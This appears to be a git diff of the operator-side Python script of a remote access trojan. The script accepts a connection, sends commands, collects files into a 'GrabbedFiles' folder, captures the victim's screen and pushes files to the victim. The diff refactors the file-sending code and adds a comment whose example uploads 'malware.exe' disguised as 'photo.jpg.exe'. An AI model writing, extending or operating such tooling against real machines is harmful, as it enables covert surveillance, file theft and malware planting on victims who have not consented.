@@ -10,28 +10,13 @@ from datetime import datetime as dt
 
 from common import receiveFile
 from common import HashMatchError
+from common import sendFile
 
 ip = "0.0.0.0"
 destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
 from common import port
 from common import chunksize
 from common import hashAlgorithm
-
-def doSend(mySocket, sourcePath, destinationPath, fileName):
-    # For 'send' operation, open the file in the read mode
-    # Read the file into packets and send them through mySocket object
-    # After finished sending the whole file, send string 'DONE' to indicate the completion
-    if os.path.exists(sourcePath + fileName):
-        sourceFile = open(sourcePath + fileName, 'rb')
-        packet = sourceFile.read(chunksize)
-        while len(packet) >0:
-            mySocket.send(packet)
-            packet = sourceFile.read(chunksize)
-        mySocket.send('DONE'.encode())
-        print('[+] Transfer Completed')
-    else:
-        mySocket.send('File not found'.encode())
-        print('[-] Unable to find the file')
 
 def connect():
     initSocket = socket.socket()
@@ -70,19 +55,19 @@ def connect():
             except Exception as e:
                 print(e)
 
-        #command format: send*<destination path>*<File Name>
-        #example: send*C:\Users\John\Desktop\*photo.jpeg
-        #source file in Linux. Example: /root/Desktop
+        # Command format: send <local filepath> <remote filepath>
+        # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
         elif 'send' in commandList[0]:
-            sendCmd, destination, fileName = command.split("*")
-            source = input("Source path: ")
+            localPath = commandList[1]
             mySocket.send(command.encode())
-            doSend(mySocket, source, destination, fileName)
+            sendFile(mySocket, localPath)
+
         elif 'screencap' == commandList[0]:
             mySocket.send(command.encode())
             # just using path here for the name
             path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
             receiveFile(mySocket, path)
+
         else:
             mySocket.send(command.encode())
             print(mySocket.recv(chunksize).decode())
